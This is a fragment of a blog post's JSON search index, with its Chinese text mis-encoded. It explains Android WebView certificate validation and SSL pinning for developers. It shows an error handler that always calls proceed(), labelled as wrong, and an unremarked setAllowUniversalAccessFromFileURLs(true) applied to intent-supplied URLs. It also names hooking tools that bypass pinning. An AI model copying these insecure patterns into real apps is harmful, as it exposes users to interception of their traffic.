","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:5:2","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x05 WebView ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"å‘é€è¯·æ±‚ é€šè¿‡Intentå¯åŠ¨webview Uri uri = Uri.parse(url); Intent intent = new Intent(Intent.ACTION_VIEW,uri); startActivity(intent); åˆ›å»ºå¸ƒå±€ \u003cWebView android:id=\"@+id/webView\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\"\u003e \u003c/WebView\u003e ä½¿ç”¨webviewåŠ è½½é¡µé¢ webView = (WebView) findViewById(R.id.webView1); webView.getSettings().setAllowUniversalAccessFromFileURLs(true); String url = getIntent().getData().toString(); webView.loadUrl(url); webView.setWebViewClient(new WebViewClient()); ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:1","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"è‡ªç­¾åè¯ä¹¦ ca è®¤è¯çš„è¯ä¹¦ï¼Œåœ¨ WebView åˆ™å¯ä»¥ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸éœ€è¦ç‰¹æ®Šå¤„ç†ã€‚ æœåŠ¡ç«¯é‡‡ç”¨çš„æ˜¯å¯ä¿¡CAé¢å‘çš„è¯ä¹¦ï¼Œéœ€è¦åœ¨webView.setWebViewClient(webviewClient)æ—¶é‡è½½WebViewClientçš„onReceivedSslError()ã€‚ é”™è¯¯çš„åšæ³•ï¼š @Override public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) { handler.proceed(); } æ­£ç¡®å†™æ³•ï¼š 1.å®‰å…¨çº§åˆ«è¾ƒä½çš„æ–¹æ¡ˆï¼šè¯ä¹¦å‡ºç°é—®é¢˜ï¼Œå¯ä»¥æç¤ºç”¨æˆ·é£é™©ï¼Œè®©ç”¨æˆ·é€‰æ‹©åŠ è½½ä¸å¦ webView.setWebViewClient(new WebViewClient() { @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) { final AlertDialog.Builder builder = new AlertDialog.Builder(WebviewActivity.this); SslCertificate sslCertificate = error.getCertificate(); switch (error.getPrimaryError()) { case SslError.SSL_DATE_INVALID: Log.i(\"lzm\", SslError.SSL_DATE_INVALID + \" ssl date invalid\"); break; case SslError.SSL_IDMISMATCH: Log.i(\"lzm\", SslError.SSL_IDMISMATCH + \" hostname dismatch\"); break; case SslError.SSL_EXPIRED: Log.i(\"lzm\", SslError.SSL_EXPIRED + \" cert has expired\"); break; case SslError.SSL_UNTRUSTED: Log.i(\"lzm\", SslError.SSL_UNTRUSTED + \" cert is not trusted\"); break; case SslError.SSL_INVALID: Log.i(\"lzm\", SslError.SSL_INVALID + \" cert is invalid\"); break; case SslError.SSL_NOTYETVALID: Log.i(\"lzm\", SslError.SSL_NOTYETVALID + \" cert is not yet valid\"); break; } builder.setTitle(\"ssl error\"); builder.setMessage(\"ssl error code: \" + error.getPrimaryError()); builder.setPositiveButton(\"proceed\", new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialogInterface, int i) { handler.proceed(); } }); builder.setNegativeButton(\"cancel\", new DialogInterface.OnClickListener() { @Override public void onClick(DialogInterface dialogInterface, int i) { handler.cancel(); } }); final AlertDialog dialog = builder.create(); dialog.show(); } }); 2.å®‰å…¨çš„æ–¹æ¡ˆæ˜¯å½“å‡ºç°äº†è¯ä¹¦é—®é¢˜çš„æ—¶å€™ï¼Œè¯»å–æœ¬åœ°ä¿å­˜çš„çš„æ ¹è¯ä¹¦ï¼Œç„¶åä¸æœåŠ¡å™¨æ ¡éªŒï¼Œé€šè¿‡åˆ™ç»§ç»­æ‰§è¡Œ handler.proceed()ï¼Œå¦åˆ™æ‰§è¡Œ handler.cancel()ã€‚ webView.setWebViewClient(new WebViewClient() { @Override public void onReceivedSslError(WebView view, final SslErrorHandler handler, SslError error) { checkCAweb(handler, view.getUrl()); } }); private void checkCAweb(final SslErrorHandler handler, String url) { OkHttpClient.Builder builder = setCer(new OkHttpClient.Builder()); Request request = new Request.Builder().url(url).build(); builder.build().newCall(request).enqueue(new Callback() { @Override public void onFailure(Call call, IOException e) { Log.i(\"lzmtest\", e.getMessage()); handler.cancel(); } @Override public void onResponse(Call call, Response response) throws IOException { Log.i(\"lzmtest\", response.body().string()); handler.proceed(); } }); } private OkHttpClient.Builder setCer(OkHttpClient.Builder client) { try { SSLContext sslContext = SSLContext.getInstance(\"TLS\"); // æ­£ç¡®å®ç°æœåŠ¡å™¨è¯ä¹¦æ ¡éªŒ trustCertï¼Œè§ä¸Šæ–‡ sslContext.init(null, trustCert, new SecureRandom()); client.sslSocketFactory(sslContext.getSocketFactory()); // æ­£ç¡®å®ç°åŸŸåæ ¡éªŒ verifyï¼Œè§ä¸Šæ–‡ client.hostnameVerifier(new MyHostnameVerifier()); } catch (Exception e) { e.printStackTrace(); } return client; } å…·ä½“ç¨‹åºè§demo (webviewtest.apk) ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:2","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"SSL Pinning Android-SSL-Pinning-WebViews åŸºæœ¬å®ç°å’Œä¸Šæ–‡ä¿æŒä¸€è‡´ï¼šåˆå§‹åŒ–keyStoreï¼Œå°†å¯ä¿¡è¯ä¹¦ï¼ˆæœ¬åœ°orç¡¬ç¼–ç ï¼‰åŠ å…¥keyStoreï¼Œåœ¨TrustManagerFactoryä¸­åˆå§‹åŒ–keyStoreï¼Œè®¾ç½®SSLcontextï¼Œç”¨TrustManageråˆå§‹åŒ–ã€‚ä½¿ç”¨ç½‘ç»œè¯·æ±‚æ¡†æ¶ï¼ˆHttpURLConnectï¼ŒOkHttpç­‰ï¼‰è®¾ç½®SocketFactoryï¼ŒsetSSLSocketFactory(sslContext.getSocketFactory())ã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:6:3","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"0x06 å°ç»“ å»ºè®®å¼€å‘æˆ–å¯¹httpsæ–¹é¢ä¸äº†è§£çš„å®‰å…¨æµ‹è¯•åŒå­¦æŸ¥çœ‹androidå¼€å‘æŒ‡å—ä¹‹é€šè¿‡HTTPS å’Œ SSLç¡®ä¿å®‰å…¨ã€‚ æ­£ç¡®å®ç°httpsä¹Ÿå¯é€šè¿‡Hookæ–¹å¼ç»•è¿‡ï¼Œandroidä¸‹å¸¸ç”¨çš„æœ‰Xposedå·¥å…·ï¼š JustTrustMe SSLUnpinning åŠFridaå·¥å…·ï¼š objection frida-android-repinning æƒ³ä¿è¯é€šä¿¡å®‰å…¨ï¼Œæ•æ„Ÿä¿¡æ¯è¿˜åº”è¯¥åšäºŒæ¬¡åŠ å¯†ï¼Œæ¥å£åšç­¾åï¼Œå®¢æˆ·ç«¯æœ¬èº«é˜²Hookç­‰ã€‚ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:7:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"},{"categories":["androidç½‘ç»œ"],"content":"å‚è€ƒ [1]https://developer.android.com/training/articles/security-ssl.html [2]https://www.cnblogs.com/liyiran/p/7011317.html [3]https://jaq.alibaba.com/community/art/show?articleid=545 [4]http://liuwangshu.cn/tags/Android%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/ [5]https://blog.csdn.net/sbsujjbcy/article/details/45568053 [6]http://find-sec-bugs.github.io/bugs.htm [7]https://blog.it-securityguard.com/the-stony-path-of-android-%F0%9F%A4%96-bug-bounty-bypassing-certificate-pinning/ ","date":"2018-03-24","objectID":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html:8:0","tags":["https","sslpinning"],"title":"androidç½‘ç»œè¯·æ±‚\u0026è¯ä¹¦è®¤è¯","uri":"/posts/android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82-%E8%AF%81%E4%B9%A6%E8%AE%A4%E8%AF%81.html"}]